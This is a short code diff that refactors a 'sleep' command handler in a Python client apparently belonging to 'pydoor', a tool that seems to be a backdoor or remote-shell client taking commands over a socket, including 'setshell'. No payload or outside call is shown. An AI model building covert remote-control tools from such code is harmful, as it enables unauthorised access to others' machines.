@@ -17,6 +17,12 @@ class Client:
         self.args = 0
 
 
+    def sleep(self):
+        self.sock.send(b"pydoor.quit")
+        time.sleep(1) #Temporary solution
+        self.sock.close()
+        self.start()
+
     def checkbash(self):
         
         try:
@@ -52,10 +58,7 @@ class Client:
                 self.sock.send(b"pydoor.quit")
                 sys.exit(0)
             elif self.args[0] == "sleep":
-                self.sock.send(b"pydoor.quit")
-                time.sleep(1) #Temporary solution
-                self.sock.close()
-                self.start()
+                self.sleep()
             elif self.args[0] == "setshell":
                 
                 if self.checkinstall(self.args[1]):
